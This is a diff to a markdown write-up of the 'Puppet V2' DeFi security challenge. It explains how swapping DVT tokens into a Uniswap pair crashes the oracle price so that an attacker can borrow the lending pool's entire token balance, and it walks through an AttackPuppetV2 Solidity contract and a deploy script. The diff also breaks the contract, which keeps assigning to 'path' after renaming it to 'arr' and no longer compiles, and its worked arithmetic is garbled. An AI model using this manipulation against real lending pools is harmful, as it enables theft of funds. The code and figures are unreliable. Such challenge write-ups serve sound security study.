@@ -96,6 +96,52 @@ You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DV
 
 # Subverting
 
+In this particular challenge, there exists a paired contract (liquidity pool) connecting WETH and DVT tokens, which PuppetV2 utilizes to ascertain the price of DVT tokens when a user initiates the `borrow()` function. This determination is made by calculating the necessary WETH deposit through a call to `UniswapV2Library`.
+
+
+```solidity
+function _getOracleQuote(uint256 amount) private view returns (uint256) {
+    (uint256 reservesWETH, uint256 reservesToken) =
+    UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
+    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
+}
+```
+
+You can find the **mathematical calculations for determining the cost of an asset in the UniswapV2 liquidity pool** contract within the `quote()` function of the UniswapV2Library contract. Here is the `quote()` function:
+
+```solidity
+// given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
+function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
+    require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
+    require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
+    amountB = amountA.mul(reserveB) / reserveA;
+}
+```
+
+When we translate this function to meaningful form, we get the following:
+
+```solidity
+uint256 cost = _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether); // For all DVTs in the Pool
+uint256 requriedWETH = UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
+
+// cost = 1.000.000 * (10e18 / 100e18) = 100.000e18
+// requiredWETH = cost * 3 = 300.000 WETH
+```
+
+Similar to the previous "Puppet" level, the vulnerability in this challenge **stems from an individual's capacity to significantly alter the price of an asset**. In this case, **the attacker, armed with a substantial number of DVT tokens, can manipulate the price of DVT by executing swaps on the Uniswap exchange, specifically in the DVT/WETH trading pair**. To **devalue the price**, the attacker must augment the DVT amount while decreasing the WETH quantity within the liquidity pool.
+
+If we employ the attacker's 10,000 DVT tokens and exchange them for WETH through the Uniswap pair contract, it will result in an increase in the DVT token quantity (from 100 to 10,100) and a decrease in the amount of WETH (from 10 to 0.0993...). This alteration will impact the ratio between them and substantially modify the cost of DVT, as follows:
+
+
+```solidity
+uint256 newCost = 1000000 * (0,0993.. / 10100e18) = 9.8321..
+uint256 newRequiredWETH = newCost * 3 = 29,4964.. WETH
+```
+
+
+
+
+
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
@@ -141,10 +187,10 @@ contract AttackPuppetV2 {
     function attack() public payable {
         uint256 tokenAmount = token.balanceOf(address(this));
         token.approve(address(uniswap), tokenAmount);
-        address[] memory path = new address[](2);
-        path[0] = address(token);
-        path[1] = address(weth);
-        uniswap.swapExactTokensForETH(tokenAmount,1,path,address(this),uint256(block.timestamp *2));
+        address[] memory arr = new address[](2);
+        path[0] = arr(token);
+        path[1] = arr(weth);
+        uniswap.swapExactTokensForETH(tokenAmount,1,arr,address(this),uint256(block.timestamp *2));
         weth.deposit{value: address(this).balance}();
         uint256 ethAmount = weth.balanceOf(address(this));
         weth.approve(address(pool), ethAmount);
@@ -158,6 +204,54 @@ contract AttackPuppetV2 {
 }
 ```
 
+First of all, the contract will get instances of contracts in the constructor as usual.
+
+```solidity
+constructor(address _pool,address _weth,address _token,address _uniswap) public {
+    pool = IPuppetV2Pool(_pool);
+    weth = IERC20(_weth);
+    token = IERC20(_token);
+    uniswap = IUniswapV2Router02(_uniswap);
+}
+```
+
+In the `attack()` function, we will approve all player's DVT balance to `UniswapRouter` contract.
+
+```solidity
+uint256 tokenAmount = token.balanceOf(address(this));
+token.approve(address(uniswap), tokenAmount);
+```
+
+Then, we will **swap all DVT tokens with WETH** using the `UniswapRouter` contract.
+
+```solidity
+address[] memory arr = new address[](2);
+path[0] = arr(token);
+path[1] = arr(weth);
+uniswap.swapExactTokensForETH(tokenAmount,1,arr,address(this),uint256(block.timestamp *2));
+```
+
+After that, our attack contract will get the extra WETH needed by interacting with `WETH9` contract.
+
+```solidity
+weth.deposit{value: address(this).balance}();
+```
+
+```solidity
+uint256 ethAmount = weth.balanceOf(address(this));
+weth.approve(address(pool), ethAmount);
+```
+
+```solidity
+uint256 poolTokenAmount = token.balanceOf(address(pool));
+pool.borrow(poolTokenAmount);
+```
+
+```solidity
+uint256 borrowTokenAmount = token.balanceOf(address(this));
+token.transfer(msg.sender, borrowTokenAmount);
+```
+Here are the attacker commands:
 ```js
 const attackFoctory = await ethers.getContractFactory("AttackPuppetV2", player);
 const attack = await attackFoctory.deploy(lendingPool.address,weth.address,token.address,uniswapRouter.address);
